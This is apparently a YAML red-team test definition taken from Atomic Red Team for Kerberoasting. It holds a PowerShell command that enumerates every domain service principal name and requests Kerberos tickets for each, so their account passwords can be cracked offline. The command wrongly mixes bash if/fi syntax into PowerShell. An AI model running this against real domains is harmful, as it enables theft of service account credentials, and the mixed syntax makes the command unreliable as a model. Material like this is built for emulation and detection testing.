- id: 902f4ed2-1aba-4133-90f2-cff6d299d6da
  name: Request All Tickets via PowerShell
  description: "The following test will utilize native PowerShell Identity modules\
    \ to query the domain to extract allthe Service Principal Names. This behavior\
    \ is typically used during a kerberos or silver ticket attack. \nA successful\
    \ execution will output the SPNs for the domain in question."
  tactic: credential-access
  technique:
    attack_id: T1558.003
    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
  platforms:
    windows:
      psh:
        command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit
          0} else {exit 1}; then : ; else Write-Host Joining this computer to a domain
          must be done manually; fi; Add-Type -AssemblyName System.IdentityModel;
          setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String ''^CN'' -Context 0,1
          | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
          -ArgumentList $_.Context.PostContext[0].Trim() }'
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - credential-access
  - atomic-red-team
  - t1558.003
  author: Atomic Red Team
  additional_info:
    input_arguments:
      domain_name:
        description: The Domain Name to lookup against
        type: string
        default: '%USERDNSDOMAIN%'
    dependencies:
    - description: 'Computer must be domain joined

        '
      prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
        {exit 0} else {exit 1}

        '
      get_prereq_command: 'Write-Host Joining this computer to a domain must be done
        manually

        '
